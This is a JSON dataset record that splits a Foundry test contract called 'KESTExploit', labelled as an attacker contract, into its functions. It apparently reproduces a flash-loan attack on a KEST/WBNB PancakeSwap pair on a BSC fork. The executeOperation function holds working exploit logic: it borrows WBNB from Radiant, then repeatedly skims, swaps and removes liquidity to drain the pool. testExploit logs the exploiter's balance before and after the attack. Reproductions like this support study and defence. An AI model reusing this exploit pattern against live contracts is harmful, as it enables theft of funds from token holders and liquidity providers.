[
  {
    "contract/interface": "KESTExploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "KESTExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "KESTExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "KESTExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "KESTExploit",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        WBNB.approve(address(PancakeRouter), type(uint256).max);\n        KEST.approve(address(PancakeRouter), type(uint256).max);\n        KEST_WBNB.approve(address(PancakeRouter), type(uint256).max);\n\n        WBNBToKEST(1e16);\n        (uint112 reserveKEST, uint112 reserveWBNB,) = KEST_WBNB.getReserves();\n        uint256 amountWBNBtoTransfer = PancakeRouter.quote(KEST.balanceOf(address(this)), reserveKEST, reserveWBNB);\n        WBNB.transfer(address(KEST_WBNB), amountWBNBtoTransfer);\n        KEST.transfer(address(KEST_WBNB), KEST.balanceOf(address(this)));\n        KEST_WBNB.mint(address(this));\n\n        uint256 i;\n        while (i < 9) {\n            WBNBToKEST(WBNB.balanceOf(address(this)));\n            uint256 cachedKESTBalance = KEST.balanceOf(address(this));\n            KEST.transfer(address(KEST_WBNB), cachedKESTBalance);\n            KEST_WBNB.skim(address(KEST_WBNB));\n            (reserveKEST, reserveWBNB,) = KEST_WBNB.getReserves();\n            uint256 amountIn = KEST.balanceOf(address(KEST_WBNB)) - reserveKEST;\n            uint256 amountOut = PancakeRouter.getAmountOut(amountIn, reserveKEST, reserveWBNB);\n            KEST_WBNB.swap(0, amountOut, address(this), bytes(\"\"));\n\n            amountOut = (cachedKESTBalance * 75) / 100;\n            address[] memory path = new address[](2);\n            path[0] = address(WBNB);\n            path[1] = address(KEST);\n            PancakeRouter.swapTokensForExactTokens(\n                amountOut, WBNB.balanceOf(address(this)), path, address(PancakeRouter), block.timestamp + 1000\n            );\n\n            PancakeRouter.removeLiquidityETHSupportingFeeOnTransferTokens(\n                address(KEST), 1e15, 1, 1, address(this), block.timestamp + 1000\n            );\n            KESTToWBNB();\n            ++i;\n        }\n        WBNB.approve(address(Radiant), flashAmount + premiums[0]);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "KESTExploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "KESTExploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", blocknumToForkFrom);\n        vm.label(address(Radiant), \"Radiant\");\n        vm.label(address(PancakeRouter), \"PancakeRouter\");\n        vm.label(address(KEST), \"KEST\");\n        vm.label(address(WBNB), \"WBNB\");\n        vm.label(address(KEST_WBNB), \"KEST_WBNB\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "KESTExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "KESTExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "KESTExploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "KESTExploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "KESTExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "KESTExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "KESTExploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"Exploiter WBNB balance before attack\", WBNB.balanceOf(address(this)), WBNB.decimals()\n        );\n\n        address[] memory assets = new address[](1);\n        assets[0] = address(WBNB);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = flashAmount;\n        uint256[] memory modes = new uint256[](1);\n        modes[0] = 0;\n        Radiant.flashLoan(address(this), assets, amounts, modes, address(this), bytes(\"\"), 0);\n\n        emit log_named_decimal_uint(\n            \"Exploiter WBNB balance after attack\", WBNB.balanceOf(address(this)), WBNB.decimals()\n        );\n    }\n\n",
    "description": ""
  }
]